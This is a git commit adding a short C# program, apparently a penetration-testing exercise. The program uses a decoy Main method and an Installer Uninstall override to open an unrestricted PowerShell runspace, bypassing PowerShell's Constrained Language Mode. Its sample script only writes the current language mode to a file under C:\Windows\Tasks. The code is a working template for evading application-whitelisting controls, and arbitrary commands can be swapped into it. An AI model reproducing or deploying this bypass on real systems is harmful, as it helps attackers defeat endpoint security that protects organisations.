1d77f720b691a01ec327edf7f1121854ad44f3ec
jasonbernier <jason.bernier@gmail.com>
2021-01-20 11:05:23 -0500

    Create BypassConstrainedLanguageMode.cs

---
+++ BypassConstrainedLanguageMode.cs
@@ -0,0 +1,31 @@
+//This bypasses constrained language mode... I think?
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("This is the main method which is a decoy");
+        }
+    }
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+        //This should let us verify what mode we are in.
+            String cmd = "$ExecutionContext.SessionState.LanguageMode > C:\\Windows\\Tasks\\mode.txt";
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+            ps.AddScript(cmd);
+            ps.Invoke();
+            rs.Close();
+        }
+    }
+}
